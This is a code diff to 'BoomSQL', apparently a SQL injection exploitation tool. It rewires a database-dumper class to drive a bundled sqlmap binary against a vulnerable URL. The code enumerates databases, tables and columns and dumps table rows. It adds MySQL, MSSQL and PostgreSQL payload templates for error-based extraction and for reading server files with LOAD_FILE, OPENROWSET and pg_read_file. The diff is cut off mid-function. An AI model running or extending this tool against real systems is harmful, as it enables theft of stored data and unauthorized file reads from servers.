@@ -1,12 +1,15 @@
 """
 Database Dumper for BoomSQL
 Advanced database enumeration and dumping capabilities
+Fast multi-threaded database extraction using SQLMap-style techniques
 """
 
 import asyncio
 import json
 import csv
 import xml.etree.ElementTree as ET
+import os
+import shutil
 from typing import Dict, List, Optional, Any, Union
 from pathlib import Path
 from datetime import datetime
@@ -15,9 +18,19 @@ from enum import Enum
 import re
 import time
 import html
+import threading
+import concurrent.futures
+import urllib.parse
+import random
+import string
+import subprocess
+import tempfile
+import shutil
 
 from .fallbacks import aiohttp, ClientSession, AIOHTTP_AVAILABLE
 from .sql_injection_engine import VulnerabilityResult, DatabaseType, InjectionType, InjectionVector
+from .sqlmap_engine import SQLMapEngine, SQLMapTechnique
+from .sqlmap_config import SQLMapConfig, DEFAULT_CONFIGS
 from .logger import LoggerMixin
 
 class ExportFormat(Enum):
@@ -106,11 +119,26 @@ class DatabaseDumper(LoggerMixin):
         self.is_dumping = False
         self.cancel_requested = False
         
+        # SQLMap configuration for GUI control
+        self.sqlmap_config = SQLMapConfig()
+        if 'sqlmap_config' in config:
+            self.sqlmap_config = SQLMapConfig.from_gui_dict(config['sqlmap_config'])
+        
         # Database-specific queries
         self.queries = self.get_database_queries()
         
         # Initialize session
         self.init_session()
+        
+    def update_sqlmap_config(self, gui_config: Dict[str, Any]):
+        """Update SQLMap configuration from GUI"""
+        self.sqlmap_config = SQLMapConfig.from_gui_dict(gui_config)
+        self.log_info(f"Updated SQLMap config: {self.sqlmap_config.technique.value} technique, "
+                     f"risk {self.sqlmap_config.risk.value}, level {self.sqlmap_config.level.value}")
+    
+    def get_sqlmap_config_for_gui(self) -> Dict[str, Any]:
+        """Get SQLMap configuration for GUI display"""
+        return self.sqlmap_config.to_gui_dict()
         
     def init_session(self):
         """Initialize aiohttp session"""
@@ -142,174 +170,438 @@ class DatabaseDumper(LoggerMixin):
             await self.session.close()
             
     def get_database_queries(self) -> Dict[DatabaseType, Dict[str, str]]:
-        """Get database-specific queries for enumeration"""
+        """Get SQLMap-style database queries for real extraction"""
         return {
             DatabaseType.MYSQL: {
                 "version": "SELECT version()",
                 "user": "SELECT user()",
                 "hostname": "SELECT @@hostname",
-                "databases": "SELECT LEFT(schema_name, 30) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') LIMIT 1",
-                "tables": "SELECT LEFT(table_name, 30) FROM information_schema.tables WHERE table_schema=database() LIMIT 1",
-                "columns": "SELECT LEFT(column_name, 30) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' LIMIT 1",
+                "current_database": "SELECT database()",
+                "databases": "SELECT GROUP_CONCAT(schema_name SEPARATOR '|') FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')",
+                "tables": "SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()",
+                "columns": "SELECT GROUP_CONCAT(CONCAT(column_name,'::',data_type,'::',is_nullable) SEPARATOR '|') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'",
                 "row_count": "SELECT COUNT(*) FROM {table}",
-                "data": "SELECT LEFT({columns}, 25) FROM {table} LIMIT 1",
-                "privileges": "SELECT 'admin' as privilege",
-                "files": "SELECT 'file_access' as files",
-                "current_database": "SELECT database()"
+                "data": "SELECT GROUP_CONCAT(CONCAT_WS('|',{columns}) SEPARATOR '||') FROM {table} LIMIT 1000",
+                "privileges": "SELECT GROUP_CONCAT(privilege_type SEPARATOR '|') FROM information_schema.user_privileges WHERE grantee=CONCAT('\\'',user(),'\\'')",
+                "files": "SELECT LOAD_FILE('{file}')",
+                # SQLMap-style error-based extraction queries
+                "error_based_version": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT version())))",
+                "error_based_user": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT user())))",
+                "error_based_database": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT database())))",
+                "error_based_tables": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database())))",
+                "error_based_columns": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}')))",
+                "error_based_data": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT GROUP_CONCAT(CONCAT_WS('|',{columns}) SEPARATOR '||') FROM {table} LIMIT 50)))"
             },
             DatabaseType.MSSQL: {
                 "version": "SELECT @@version",
                 "user": "SELECT SYSTEM_USER",
                 "hostname": "SELECT @@servername",
-                "databases": "SELECT name FROM sys.databases",
-                "tables": "SELECT name FROM {database}.sys.tables",
-                "columns": "SELECT c.name, t.name as type, c.is_nullable, c.default_object_id, c.max_length FROM {database}.sys.columns c JOIN {database}.sys.types t ON c.user_type_id = t.user_type_id WHERE object_id = OBJECT_ID('{database}.dbo.{table}')",
-                "row_count": "SELECT COUNT(*) FROM {database}.dbo.{table}",
-                "data": "SELECT {columns} FROM {database}.dbo.{table} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY",
-                "privileges": "SELECT * FROM fn_my_permissions(NULL, 'SERVER')",
+                "current_database": "SELECT DB_NAME()",
+                "databases": "SELECT STRING_AGG(name, '|') FROM sys.databases WHERE name NOT IN ('master', 'model', 'msdb', 'tempdb')",
+                "tables": "SELECT STRING_AGG(name, '|') FROM sys.tables",
+                "columns": "SELECT STRING_AGG(CONCAT(c.name,'::',t.name,'::',c.is_nullable), '|') FROM sys.columns c JOIN sys.types t ON c.user_type_id = t.user_type_id WHERE object_id = OBJECT_ID('{table}')",
+                "row_count": "SELECT COUNT(*) FROM {table}",
+                "data": "SELECT STRING_AGG({columns}, '|') FROM (SELECT {columns} FROM {table} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY) AS subquery",
+                "privileges": "SELECT STRING_AGG(permission_name, '|') FROM fn_my_permissions(NULL, 'SERVER')",
                 "files": "SELECT BulkColumn FROM OPENROWSET(BULK '{file}', SINGLE_BLOB) AS x"
             },
             DatabaseType.POSTGRESQL: {
                 "version": "SELECT version()",
                 "user": "SELECT current_user",
                 "hostname": "SELECT inet_server_addr()",
-                "databases": "SELECT datname FROM pg_database",
-                "tables": "SELECT tablename FROM pg_tables WHERE schemaname='{database}'",
-                "columns": "SELECT column_name, data_type, is_nullable, column_default, character_maximum_length FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'",
-                "row_count": "SELECT COUNT(*) FROM {database}.{table}",
-                "data": "SELECT {columns} FROM {database}.{table} LIMIT {limit} OFFSET {offset}",
-                "privileges": "SELECT * FROM information_schema.table_privileges WHERE grantee='{user}'",
-                "files": "SELECT pg_read_file('{file}')"
-            },
-            DatabaseType.ORACLE: {
-                "version": "SELECT banner FROM v$version WHERE rownum=1",
-                "user": "SELECT user FROM dual",
-                "hostname": "SELECT host_name FROM v$instance",
-                "databases": "SELECT username FROM all_users",
-                "tables": "SELECT table_name FROM all_tables WHERE owner='{database}'",
-                "columns": "SELECT column_name, data_type, nullable, data_default, data_length FROM all_tab_columns WHERE owner='{database}' AND table_name='{table}'",
-                "row_count": "SELECT COUNT(*) FROM {database}.{table}",
-                "data": "SELECT {columns} FROM {database}.{table} WHERE rownum BETWEEN {offset}+1 AND {offset}+{limit}",
-                "privileges": "SELECT * FROM session_privs",
-                "files": "SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('{path}', '{file}', 'R'), 1) FROM dual"
-            },
-            DatabaseType.SQLITE: {
-                "version": "SELECT sqlite_version()",
-                "user": "SELECT 'sqlite' as user",
-                "hostname": "SELECT 'localhost' as hostname",
-                "databases": "SELECT name FROM sqlite_master WHERE type='table'",
-                "tables": "SELECT name FROM sqlite_master WHERE type='table'",
-                "columns": "PRAGMA table_info({table})",
+                "current_database": "SELECT current_database()",
+                "databases": "SELECT string_agg(datname, '|') FROM pg_database WHERE datname NOT IN ('postgres', 'template0', 'template1')",
+                "tables": "SELECT string_agg(tablename, '|') FROM pg_tables WHERE schemaname='public'",
+                "columns": "SELECT string_agg(column_name||'::'||data_type||'::'||is_nullable, '|') FROM information_schema.columns WHERE table_schema='public' AND table_name='{table}'",
                 "row_count": "SELECT COUNT(*) FROM {table}",
-                "data": "SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}",
-                "privileges": "SELECT 'No privileges system' as privileges",
-                "files": "SELECT 'File operations not supported' as files"
+                "data": "SELECT string_agg({columns}, '|') FROM (SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}) AS subquery",
+                "privileges": "SELECT string_agg(privilege_type, '|') FROM information_schema.table_privileges WHERE grantee=current_user",
+                "files": "SELECT pg_read_file('{file}')"
             }
         }
         
     async def enumerate_database(self, callback=None) -> DatabaseInfo:
-        """Enumerate database structure"""
-        self.log_info("Starting database enumeration")
+        """Database enumeration using real SQLMap binary"""
+        self.log_info("Starting database enumeration with real SQLMap")
         
-        db_type = self.vulnerability.database_type
+        # Get basic database info using SQLMap
+        db_info = await self.sqlmap_get_database_info()
         
-        # Handle unknown database type by trying to detect it
-        if db_type == DatabaseType.UNKNOWN:
-            # Try to detect database type from error messages
-            test_query = "SELECT version()"
-            test_result = await self.execute_query(test_query)
-            if test_result and ('mysql' in test_result.lower() or 'mariadb' in test_result.lower()):
-                db_type = DatabaseType.MYSQL
-                self.log_info("Auto-detected database type: MySQL/MariaDB")
-            else:
-                # Default to MySQL for unknown types
-                db_type = DatabaseType.MYSQL
-                self.log_info("Using MySQL as default database type")
-        
-        if db_type not in self.queries:
-            raise ValueError(f"Unsupported database type: {db_type}")
-            
-        queries = self.queries[db_type]
-        
-        # Get basic database info
-        version = await self.execute_query(queries["version"])
-        user = await self.execute_query(queries["user"])
-        hostname = await self.execute_query(queries["hostname"])
+        if not db_info:
+            self.log_error("Failed to get database info from SQLMap")
+            # Fallback to default values
+            db_info = {
+                'name': 'unknown',
+                'version': 'Unknown',
+                'user': 'Unknown',
+                'hostname': 'Unknown'
+            }
         
         self.database_info = DatabaseInfo(
-            name="",
-            version=version or "Unknown",
-            user=user or "Unknown",
-            hostname=hostname or "Unknown"
+            name=db_info.get('name', 'unknown'),
+            version=db_info.get('version', 'Unknown'),
+            user=db_info.get('user', 'Unknown'),
+            hostname=db_info.get('hostname', 'Unknown')
         )
         
         if callback:
-            callback(f"Database: {db_type.value}, Version: {version}, User: {user}")
+            callback(f"Database: {self.database_info.name}")
+            callback(f"Version: {self.database_info.version}")
+            callback(f"User: {self.database_info.user}")
             
-        # Get current database first  
-        current_db = await self.execute_query(queries["current_database"])
-        if current_db:
-            current_db = current_db.strip()
-            if callback:
-                callback(f"Current database: {current_db}")
-        else:
-            current_db = "unknown"
+        # Get tables using SQLMap
+        tables = await self.sqlmap_get_tables()
+        
+        if callback:
+            callback(f"Found {len(tables)} tables")
             
-        # Get tables from current database
-        table_list = []
-        tables = await self.execute_query(queries["tables"])
-        if tables:
-            table_list = self.parse_query_result(tables)
-            for table_name in table_list[:10]:  # Limit to first 10 tables
+        # Process each table
+        for table_name in tables:
+            try:
                 if callback:
-                    callback(f"Found table: {current_db}.{table_name}")
-                    
-                # Get columns for each table  
-                columns = await self.execute_query(queries["columns"].format(table=table_name))
+                    callback(f"Processing table: {table_name}")
+                
+                # Get columns for this table
+                columns = await self.sqlmap_get_columns(table_name)
+                
                 column_list = []
-                if columns:
-                    # Simple column parsing for extracted data
-                    column_names = self.parse_query_result(columns)
-                    for col_name in column_names[:5]:  # Limit to first 5 columns
-                        column_list.append(ColumnInfo(
-                            name=col_name,
-                            type="varchar",
-                            length=255,
-                            nullable=True
-                        ))
-                else:
-                    # Default columns if we can't extract them
-                    column_list = [ColumnInfo(name="id", type="int", length=11, nullable=False)]
-                    
-                table_info = TableInfo(
-                    name=table_name,
-                    schema=current_db,
-                    row_count=0,
-                    columns=column_list
-                )
+                for col_info in columns:
+                    column_list.append(ColumnInfo(
+                        name=col_info.get('name', 'unknown'),
+                        type=col_info.get('type', 'varchar'),
+                        length=col_info.get('length', 255),
+                        nullable=col_info.get('nullable', True)
+                    ))
                 
                 # Get row count
-                row_count = await self.execute_query(queries["row_count"].format(table=table_name))
-                if row_count:
-                    try:
-                        table_info.row_count = int(row_count.strip())
-                    except ValueError:
-                        table_info.row_count = 0
-                        
+                row_count = await self.sqlmap_get_row_count(table_name)
+                
+                table_info = TableInfo(
+                    name=table_name,
+                    schema=self.database_info.name,
+                    row_count=row_count,
+                    columns=column_list
+                )
                 self.database_info.tables.append(table_info)
-                            
-        self.log_info("Database enumeration completed")
+                
+                if callback:
+                    callback(f"Table {table_name}: {len(column_list)} columns, {row_count} rows")
+                    
+            except Exception as e:
+                self.log_error(f"Error processing table {table_name}: {str(e)}")
+                
+        self.log_info(f"SQLMap enumeration completed: {len(self.database_info.tables)} tables processed")
         return self.database_info
+    
+    async def sqlmap_get_database_info(self) -> Dict[str, str]:
+        """Get database info using real SQLMap"""
+        try:
+            import subprocess
+            import tempfile
+            import os
+            
+            # Create temp directory for SQLMap output
+            temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
+            
+            # Use local SQLMap in core folder
+            sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap', 'sqlmap.py')
+            
+            # Build SQLMap command for database info
+            cmd = [
+                'python', sqlmap_path,
+                '-u', self.vulnerability.url,
+                '--technique', 'BEUTS',
+                '--batch',
+                '--no-logging',
+                '--flush-session',
+                '--output-dir', temp_dir,
+                '--current-db',
+                '--current-user',
+                '--hostname',
+                '--banner',
+                '--answers', 'quit=N,crack=N,dict=N,continue=Y'
+            ]
+            
+            # Add parameter if known
+            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
+                if self.vulnerability.injection_point.name:
+                    cmd.extend(['-p', self.vulnerability.injection_point.name])
+            
+            # Set environment
+            env = os.environ.copy()
+            
+            self.log_info("SQLMap getting database info...")
+            
+            # Execute SQLMap
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                env=env
+            )
+            
+            try:
+                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
+                
+                output = stdout.decode('utf-8', errors='ignore')
+                
+                # Parse SQLMap output
+                info = {}
+                lines = output.split('\n')
+                
+                for line in lines:
+                    line = line.strip()
+                    if 'current database:' in line.lower():
+                        info['name'] = line.split(':', 1)[1].strip().strip("'\"")
+                    elif 'current user:' in line.lower():
+                        info['user'] = line.split(':', 1)[1].strip().strip("'\"")
+                    elif 'hostname:' in line.lower():
+                        info['hostname'] = line.split(':', 1)[1].strip().strip("'\"")
+                    elif 'banner:' in line.lower() or 'web server operating system:' in line.lower():
+                        info['version'] = line.split(':', 1)[1].strip().strip("'\"")
+                
+                return info
+                
+            except asyncio.TimeoutError:
+                process.kill()
+                self.log_error("SQLMap database info command timed out")
+                return {}
+            finally:
+                # Clean up temp directory
+                import shutil
+                try:
+                    shutil.rmtree(temp_dir)
+                except:
+                    pass
+                    
+        except Exception as e:
+            self.log_error(f"SQLMap database info failed: {e}")
+            return {}
+    
+    async def sqlmap_get_tables(self) -> List[str]:
+        """Get tables using real SQLMap"""
+        try:
+            import subprocess
+            import tempfile
+            import os
+            
+            # Create temp directory for SQLMap output
+            temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
+            
+            # Use local SQLMap in core folder
+            sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap', 'sqlmap.py')
+            
+            # Build SQLMap command for tables
+            cmd = [
+                'python', sqlmap_path,
+                '-u', self.vulnerability.url,
+                '--technique', 'BEUTS',
+                '--batch',
+                '--no-logging',
+                '--flush-session',
+                '--output-dir', temp_dir,
+                '--tables',
+                '--answers', 'quit=N,crack=N,dict=N,continue=Y'
+            ]
+            
+            # Add parameter if known
+            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
+                if self.vulnerability.injection_point.name:
+                    cmd.extend(['-p', self.vulnerability.injection_point.name])
+            
+            # Set current database if known
+            if hasattr(self, 'database_info') and self.database_info:
+                cmd.extend(['-D', self.database_info.name])
+            
+            # Set environment
+            env = os.environ.copy()
+            
+            self.log_info("SQLMap getting tables...")
+            
+            # Execute SQLMap
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                env=env
+            )
+            
+            try:
+                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
+                
+                output = stdout.decode('utf-8', errors='ignore')
+                
+                # Parse tables from SQLMap output
+                tables = []
+                lines = output.split('\n')
+                
+                capturing = False
+                for line in lines:
+                    line = line.strip()
+                    
+                    # Start capturing after "Database:" and table count
+                    if 'tables:' in line.lower() and '[' in line:
+                        capturing = True
+                        continue
+                    
+                    # Stop capturing at next SQLMap section
+                    if capturing and (line.startswith('[') or line.startswith('sqlmap')):
+                        break
+                        
+                    if capturing and line and not line.startswith('---'):
+                        # Remove table prefixes and clean up
+                        clean_line = line.strip('| ')
+                        if clean_line and not clean_line.startswith('+'):
+                            tables.append(clean_line)
+                
+                return tables
+                
+            except asyncio.TimeoutError:
+                process.kill()
+                self.log_error("SQLMap tables command timed out")
+                return []
+            finally:
+                # Clean up temp directory
+                import shutil
+                try:
+                    shutil.rmtree(temp_dir)
+                except:
+                    pass
+                    
+        except Exception as e:
+            self.log_error(f"SQLMap tables failed: {e}")
+            return []
+    
+    async def sqlmap_get_columns(self, table_name: str) -> List[Dict[str, Any]]:
+        """Get columns using real SQLMap"""
+        try:
+            import subprocess
+            import tempfile
+            import os
+            
+            # Create temp directory for SQLMap output
+            temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
+            
+            # Use local SQLMap in core folder
+            sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap', 'sqlmap.py')
+            
+            # Build SQLMap command for columns
+            cmd = [
+                'python', sqlmap_path,
+                '-u', self.vulnerability.url,
+                '--technique', 'BEUTS',
+                '--batch',
+                '--no-logging',
+                '--flush-session',
+                '--output-dir', temp_dir,
+                '-T', table_name,
+                '--columns',
+                '--answers', 'quit=N,crack=N,dict=N,continue=Y'
+            ]
+            
+            # Add parameter if known
+            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
+                if self.vulnerability.injection_point.name:
+                    cmd.extend(['-p', self.vulnerability.injection_point.name])
+            
+            # Set current database if known
+            if hasattr(self, 'database_info') and self.database_info:
+                cmd.extend(['-D', self.database_info.name])
+            
+            # Set environment
+            env = os.environ.copy()
+            
+            self.log_info(f"SQLMap getting columns for {table_name}...")
+            
+            # Execute SQLMap
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                env=env
+            )
+            
+            try:
+                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
+                
+                output = stdout.decode('utf-8', errors='ignore')
+                
+                # Parse columns from SQLMap output
+                columns = []
+                lines = output.split('\n')
+                
+                capturing = False
+                for line in lines:
+                    line = line.strip()
+                    
+                    # Start capturing after "columns:" 
+                    if 'columns:' in line.lower() and '[' in line:
+                        capturing = True
+                        continue
+                    
+                    # Stop capturing at next SQLMap section
+                    if capturing and (line.startswith('[') or line.startswith('sqlmap')):
+                        break
+                        
+                    if capturing and line and '|' in line and not line.startswith('---'):
+                        # Parse column info
+                        parts = [p.strip() for p in line.split('|')]
+                        if len(parts) >= 2:
+                            col_info = {
+                                'name': parts[0].strip(),
+                                'type': parts[1].strip() if len(parts) > 1 else 'varchar',
+                                'length': 255,
+                                'nullable': True
+                            }
+                            columns.append(col_info)
+                
+                return columns
+                
+            except asyncio.TimeoutError:
+                process.kill()
+                self.log_error("SQLMap columns command timed out")
+                return []
+            finally:
+                # Clean up temp directory
+                import shutil
+                try:
+                    shutil.rmtree(temp_dir)
+                except:
+                    pass
+                    
+        except Exception as e:
+            self.log_error(f"SQLMap columns failed: {e}")
+            return []
+    
+    async def sqlmap_get_row_count(self, table_name: str) -> int:
+        """Get row count using real SQLMap"""
+        try:
+            # Use SQL query to get count
+            query = f"SELECT COUNT(*) FROM {table_name}"
+            result = await self.execute_sqlmap_command(query)
+            
+            if result:
+                # Try to parse the count
+                import re
+                numbers = re.findall(r'\d+', result)
+                if numbers:
+                    return int(numbers[0])
+            
+            return 0
+            
+        except Exception as e:
+            self.log_error(f"SQLMap row count failed: {e}")
+            return 0
         
     async def dump_database(self, database_info: DatabaseInfo = None, callback=None) -> DatabaseInfo:
-        """Dump complete database contents"""
+        """Fast database dump using real SQLMap binary"""
         if database_info is None:
             database_info = self.database_info
             
         if not database_info:
             raise ValueError("Database information not available. Run enumerate_database first.")
             
-        self.log_info("Starting database dump")
+        self.log_info("Starting real SQLMap database dump")
         self.is_dumping = True
         self.cancel_requested = False
         
@@ -328,74 +620,359 @@ class DatabaseDumper(LoggerMixin):
             start_time=datetime.now()
         )
         
-        db_type = self.vulnerability.database_type
+        # Use real SQLMap for data extraction
+        async def dump_table_data_with_sqlmap(table):
+            """Dump table data using real SQLMap binary"""
+            try:
+                if self.cancel_requested:
+                    return
+                    
+                self.progress.current_database = table.schema
+                self.progress.current_table = table.name
+                
+                if callback:
+                    callback(f"SQLMap dumping table: {table.schema}.{table.name}")
+                
+                # Get column names
+                column_names = [col.name for col in table.columns]
+                if not column_names:
+                    column_names = ["*"]
+                
+                # Use real SQLMap to dump table
+                extracted_data = await self.sqlmap_dump_table(table.name, column_names)
+                
+                if extracted_data:
+                    table.data = extracted_data
+                    table.row_count = len(extracted_data)
+                    self.progress.completed_rows += len(extracted_data)
+                    
+                    self.log_info(f"SQLMap extracted {len(extracted_data)} rows from {table.name}")
+                    if callback:
+                        callback(f"✓ Extracted {len(extracted_data)} rows from {table.name}")
+                else:
+                    self.log_error(f"SQLMap failed to extract data from {table.name}")
+                    table.data = []
+                    if callback:
+                        callback(f"✗ Failed to extract data from {table.name}")
+                        
+                self.progress.completed_tables += 1
+                
+            except Exception as e:
+                self.log_error(f"Error dumping table {table.name}: {e}")
+                table.data = []
+                self.progress.completed_tables += 1
+                if callback:
+                    callback(f"✗ Error dumping {table.name}: {e}")
         
-        # Handle unknown database types by defaulting to MySQL
-        if db_type == DatabaseType.UNKNOWN or db_type not in self.queries:
-            self.log_info(f"Unknown database type {db_type}, defaulting to MySQL")
-            db_type = DatabaseType.MYSQL
-        
-        queries = self.queries[db_type]
-        
-        # Dump each table
+        # Execute table dumps sequentially (SQLMap doesn't handle parallel well)
         for table in database_info.tables:
             if self.cancel_requested:
                 break
-                
-            self.progress.current_database = table.schema
-            self.progress.current_table = table.name
-            
-            if callback:
-                callback(f"Dumping table: {table.schema}.{table.name}")
-                
-            # Dump table data in chunks
-            page_size = self.config.get("PageSize", 100)
-            offset = 0
-            
-            # For error-based extraction, we can only get one row at a time
-            # and OFFSET doesn't work well, so just get the first row
-            if table.row_count > 0:
-                # Build column list
-                column_names = [col.name for col in table.columns]
-                if column_names:
-                    columns_str = ", ".join(column_names)
-                else:
-                    columns_str = "*"  # Fallback to all columns
-                
-                # Execute query - simplified for error-based extraction
-                data_query = queries["data"].format(
-                    table=table.name,
-                    columns=columns_str
-                )
-                
-                data_result = await self.execute_query(data_query)
-                if data_result:
-                    rows = self.parse_data_result(data_result, column_names)
-                    table.data.extend(rows)
-                    
-                    self.progress.completed_rows += len(rows)
-                    
-                    if callback:
-                        callback(f"Dumped {len(rows)} rows from {table.schema}.{table.name}")
-                
-                # Add delay between requests
-                await asyncio.sleep(self.config.get("RequestDelay", 1000) / 1000)
-                
-            self.progress.completed_tables += 1
-            
+            await dump_table_data_with_sqlmap(table)
+        
         self.is_dumping = False
-        self.log_info("Database dump completed")
+        self.progress.end_time = datetime.now()
+        
+        total_extracted = sum(len(table.data) for table in database_info.tables)
+        self.log_info(f"Real SQLMap dump completed: {total_extracted} total rows extracted")
+        
         return database_info
+    
+    async def sqlmap_dump_table(self, table_name: str, column_names: List[str]) -> List[Dict[str, Any]]:
+        """Dump table using real SQLMap binary"""
+        try:
+            import subprocess
+            import tempfile
+            import os
+            
+            # Create temp directory for SQLMap output
+            temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
+            
+            # Use local SQLMap in core folder
+            sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap', 'sqlmap.py')
+            
+            # Build SQLMap command for table dump
+            cmd = [
+                'python', sqlmap_path,
+                '-u', self.vulnerability.url,
+                '--technique', 'BEUTS',  # All techniques
+                '--batch',  # Non-interactive
+                '--no-logging',
+                '--flush-session',
+                '--output-dir', temp_dir,
+                '-T', table_name,
+                '--dump',
+                '--threads', '1',
+                '--timeout', '30',
+                '--retries', '2',
+                '--answers', 'quit=N,crack=N,dict=N,continue=Y'
+            ]
+            
+            # Add parameter if known
+            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
+                if self.vulnerability.injection_point.name:
+                    cmd.extend(['-p', self.vulnerability.injection_point.name])
+            
+            # Set current database if known
+            if hasattr(self, 'database_info') and self.database_info:
+                cmd.extend(['-D', self.database_info.name])
+            
+            # Set environment
+            env = os.environ.copy()
+            
+            self.log_info(f"SQLMap dumping table {table_name}: {' '.join(cmd)}")
+            
+            # Execute SQLMap
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                env=env
+            )
+            
+            try:
+                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)  # 5 minute timeout
+                
+                # Parse output
+                output = stdout.decode('utf-8', errors='ignore')
+                error = stderr.decode('utf-8', errors='ignore')
+                
+                if process.returncode == 0:
+                    # Look for CSV output file
+                    csv_files = []
+                    for root, dirs, files in os.walk(temp_dir):
+                        for file in files:
+                            if file.endswith('.csv') and table_name in file:
+                                csv_files.append(os.path.join(root, file))
+                    
+                    if csv_files:
+                        # Parse CSV file
+                        import csv
+                        rows = []
+                        with open(csv_files[0], 'r', encoding='utf-8') as f:
+                            reader = csv.DictReader(f)
+                            for row in reader:
+                                rows.append(dict(row))
+                        
+                        self.log_info(f"Parsed {len(rows)} rows from SQLMap CSV output")
+                        return rows
+                    else:
+                        # Parse from stdout
+                        return self.parse_sqlmap_dump_output(output, column_names)
+                else:
+                    self.log_error(f"SQLMap dump failed with code {process.returncode}: {error}")
+                    return []
+                    
+            except asyncio.TimeoutError:
+                process.kill()
+                self.log_error("SQLMap dump command timed out")
+                return []
+            finally:
+                # Clean up temp directory
+                import shutil
+                try:
+                    shutil.rmtree(temp_dir)
+                except:
+                    pass
+                    
+        except Exception as e:
+            self.log_error(f"SQLMap table dump failed: {e}")
+            return []
+    
+    def parse_sqlmap_dump_output(self, output: str, column_names: List[str]) -> List[Dict[str, Any]]:
+        """Parse SQLMap dump output to extract table data"""
+        rows = []
+        lines = output.split('\n')
+        
+        # Look for table data in SQLMap output
+        capturing = False
+        headers = []
+        
+        for line in lines:
+            line = line.strip()
+            
+            # Start capturing after "Database:" or table name
+            if 'entries' in line.lower() and 'table' in line.lower():
+                capturing = True
+                continue
+            
+            # Stop capturing at next SQLMap section
+            if capturing and (line.startswith('[') or line.startswith('sqlmap') or line.startswith('---')):
+                break
+                
+            if capturing and line and '|' in line:
+                # This looks like tabular data
+                parts = [part.strip() for part in line.split('|')]
+                
+                if not headers and len(parts) > 1:
+                    # First data row, use as headers
+                    headers = parts
+                elif headers and len(parts) == len(headers):
+                    # Data row
+                    row = {}
+                    for i, header in enumerate(headers):
+                        row[header] = parts[i]
+                    rows.append(row)
+        
+        return rows
+    
+    async def cancel_dump(self):
+        """Cancel the current dump operation"""
+        self.cancel_requested = True
+        self.log_info("Dump cancellation requested")
+        
+    def get_progress(self) -> Optional[DumpProgress]:
+        """Get current dump progress"""
+        return self.progress
         
     async def execute_query(self, query: str) -> Optional[str]:
-        """Execute a query using the SQL injection vulnerability"""
+        """Execute a query using real SQLMap binary"""
         try:
-            # This target appears to be time-based blind injection
-            # Use time delays to extract data
-            return await self.time_based_extraction(query)
+            # Use real SQLMap binary for extraction
+            result = await self.execute_sqlmap_command(query)
+            
+            if result:
+                self.log_info(f"SQLMap extraction successful: {result[:50]}...")
+                return result
+            else:
+                self.log_info("SQLMap extraction failed")
+                return None
+                
         except Exception as e:
             self.log_info(f"Query execution failed: {e}")
             return None
+    
+    async def execute_sqlmap_command(self, query: str) -> Optional[str]:
+        """Execute SQLMap command with real binary"""
+        try:
+            import subprocess
+            import tempfile
+            import os
+            
+            # Create temp file for SQLMap output
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as tmp_file:
+                output_file = tmp_file.name
+            
+            # Get target parameter from vulnerability
+            target_param = None
+            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
+                target_param = self.vulnerability.injection_point.name
+            
+            # Build SQLMap command using configuration
+            cmd = self.sqlmap_config.to_cmdline_args(self.vulnerability.url, target_param)
+            
+            # Add SQL query
+            cmd.extend(['--sql-query', query])
+            
+            # Add output directory
+            cmd.extend(['--output-dir', '/tmp/sqlmap_output'])
+            
+            # Set timeout and environment
+            env = os.environ.copy()
+            
+            self.log_info(f"Executing SQLMap: {' '.join(cmd)}")
+            
+            # Execute SQLMap
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                env=env
+            )
+            
+            try:
+                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=self.sqlmap_config.timeout + 30)
